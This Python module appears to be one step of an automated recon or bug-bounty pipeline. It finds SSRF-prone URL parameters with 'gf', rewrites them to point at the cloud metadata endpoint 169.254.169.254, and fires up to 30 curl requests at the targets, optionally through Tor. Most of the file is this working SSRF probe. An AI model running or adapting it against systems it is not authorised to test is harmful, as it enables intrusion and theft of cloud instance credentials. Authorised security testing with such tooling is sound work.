#!/usr/bin/env python3
# modules/step11_ssrf.py
import os
from core.utils import count_lines

class SSRFStep:
    def __init__(self, p): self.p=p; self.log=p.log; self.f=p.files

    def run(self):
        urls      = self.f["urls"]
        ssrf_out  = self.f["ssrf_params"]

        self.p.shell(f"cat {urls} 2>/dev/null | gf ssrf > {ssrf_out} 2>/dev/null", label="gf ssrf")

        n = count_lines(ssrf_out)
        if n>0:
            self.p.add_finding("high","SSRF_PARAMS", ssrf_out, f"{n} potential SSRF params", "gf")
            # Basic probe with Burp Collaborator placeholder
            ssrf_probe = os.path.join(self.p.out, f"{self.p.prefix}_ssrf_probe.txt")
            self.p.shell(
                f"cat {ssrf_out} | head -30 | while read u; do "
                f"  mod=$(echo \"$u\" | sed 's|=http[^&]*|=http://169.254.169.254/latest/meta-data/|g'); "
                f"  code=$(curl -sk -o /dev/null -w '%{{http_code}}' --connect-timeout 5 \"$mod\"); "
                f"  echo \"$code $mod\" >> {ssrf_probe}; "
                f"done",
                label="ssrf probe", use_tor=bool(self.p.tor)
            )
        self.log.success(f"SSRF params: {n} → {os.path.basename(ssrf_out)}")
